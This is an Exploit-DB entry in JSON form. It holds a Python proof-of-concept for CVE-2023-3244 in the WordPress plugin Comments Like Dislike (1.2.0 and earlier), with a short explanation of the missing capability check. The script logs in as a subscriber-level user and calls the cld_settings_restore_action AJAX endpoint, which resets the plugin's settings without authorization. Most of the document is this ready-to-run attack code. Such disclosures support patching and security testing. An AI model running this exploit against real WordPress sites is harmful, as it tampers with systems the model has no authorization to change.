{"source": "https://www.exploit-db.com/exploits/51809", "vulnName": "comments-like-dislike < 1.2.0 - Authenticated (Subscriber+) Plugin Setting Reset", "vulnEDBID": "51809", "vulnCVE": "N/A", "author": "DIAA HANNA", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-02-26", "vulnContent": "# Exploit Title: POC-CVE-2023-3244\n# Date: 9/12/2023\n# Exploit Author: Diaa Hanna\n# Software Link: [download link if available]\n# Version: <= 1.2.0 comments-like-dislike\n# Tested on: 1.1.6 comments-like-dislike\n# CVE : CVE-2023-3244\n\n#References\n#https://nvd.nist.gov/vuln/detail/CVE-2023-3244\n\n\n#The Comments Like Dislike plugin for WordPress has been found to have a vulnerability that allows unauthorized modification of data. This vulnerability arises due to a missing capability check on the restore_settings function, which is called through an AJAX action. The vulnerability affects versions up to and including 1.2.0 of the plugin.\n#This security flaw enables authenticated attackers with minimal permissions, such as subscribers, to reset the plugin's settings. It's important to note that this issue was only partially patched in version 1.2.0, as the nonce (a security measure) is still accessible to subscriber-level users.\n#For more detailed information about this bug, you can refer to the National Vulnerability Database (NVD) website at [CVE-2023-3244](https://nvd.nist.gov/vuln/detail/CVE-2023-3244).\n\nimport requests \nimport argparse\nimport sys\nfrom colorama import Fore\n\nparser = argparse.ArgumentParser(prog='POC-CVE-2023-3244',description='This is a proof of concept for the CVE-2023-3244 it is an access control vulnerability in the restore_settings function ')\nparser.add_argument('-u','--username',help='username of a user on wordpress with low privileges',required=True)\nparser.add_argument('-p',\"--password\",help='password of a user on wordpress with low privileges',required=True)\nparser.add_argument('--url',help='the url of the vulnerable server (with http or https)',required=True)\nparser.add_argument('--nossl',help='disable ssl verification',action='store_true',required=False,default=False)\nargs=parser.parse_args()\n\n#check if the domain ends with a '/' if not then add it\nurl=args.url\nif url[-1] != '/':\n    url+='/'\n\n\n\nwp_login = f'{url}wp-login.php'\nwp_admin = f'{url}wp-admin/'\nusername = args.username \npassword = args.password \n\n\nsession=requests.Session()\n#logging in\nsession.post(wp_login, headers={'Cookie':'wordpress_test_cookie=WP Cookie check'}, data={'log':username, 'pwd':password, 'wp-submit':'Log In', \n        'redirect_to':wp_admin, 'testcookie':'1'  },verify=not (args.nossl))\n#if failed to login\nif len(session.cookies.get_dict()) == 2:\n    print(Fore.RED +\"Error Logging In Check Your Username and Password And Try Again\")\n    sys.exit(1)\n\n#making the ajax request to wp_ajax_cld_settings_restore_action this line will call the restore_settings function \n#the restore_settings function does not check the sufficient privileges of a logged-in user \n#even a subscriber can use this POC\nresponse=session.get(f\"{wp_admin}/admin-ajax.php?action=cld_settings_restore_action\",verify=not (args.nossl))\n\nif response.text == \"Settings restored successfully.Redirecting...\":\n    print(Fore.GREEN +\"exploited excuted successfully\")\n    print(Fore.YELLOW+ \"settings of the comments-like-dislike plugin should be defaulted on the server\")\n    sys.exit(0)\nelse:\n    print(Fore.RED + \"some error occurred please read the source code of the poc it isn't that long anyway\")\n    sys.exit(1)\n            "}